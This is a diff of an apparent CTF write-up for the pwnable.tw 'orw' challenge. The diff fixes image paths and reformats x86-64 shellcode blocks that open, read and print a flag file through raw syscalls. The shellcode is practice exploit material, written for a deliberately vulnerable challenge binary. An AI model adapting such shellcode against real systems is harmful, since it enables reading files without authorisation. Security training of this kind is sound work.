@@ -13,11 +13,11 @@
 
 [hint](https://drx.home.blog/2019/04/03/pwnable-tw-orw/ )
 
-![checkfile](images\checkfile.png)
+![checkfile](images/checkfile.png)
 
 ![test](images/test.png)
 
-![syscall](images\syscall_syntax.png)
+![syscall](images/syscall_syntax.png)
 
 ```js
 mov 	rbx, %d' % u64(b'.txt\x00\x00\x00\x00')
@@ -29,25 +29,25 @@ push 	rbx
 ```
 
 ```js
-mov		rdi, rsp		
-mov		rsi, 0
+mov	rdi, rsp		
+mov	rsi, 0
 mov 	rdx, 0	
-mov		rax, 2	
+mov	rax, 2	
 syscall
 ```
 
 ```js
-mov		rdi, rax
-mov		rsi, rsp
-mov		rdx, 0x100
+mov	rdi, rax
+mov	rsi, rsp
+mov	rdx, 0x100
 mov 	rax, 0
 syscall
 ```
 
 ```js
-mov		rdi, 1
-mov		rsi, rsp
-mov		rdx, rax
+mov	rdi, 1
+mov	rsi, rsp
+mov	rdx, rax
 mov 	rax, 1
 syscall
 ```
